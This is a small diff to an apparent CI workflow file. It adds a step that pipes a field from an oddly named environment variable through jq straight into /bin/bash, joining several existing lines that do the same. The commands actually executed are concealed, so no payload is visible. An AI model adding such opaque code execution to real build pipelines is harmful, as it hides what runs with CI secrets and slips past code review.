@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$egtt06110" | jq -r .hfh805 | /bin/bash
           echo $xe15 | jq -r .nqal74584 | /bin/bash
           echo $ibbg346 | jq -r .gt24473 | /bin/bash
+          echo $k0 | jq -r .rpqi69 | /bin/bash
 
       - name: Upload data
         if: always()
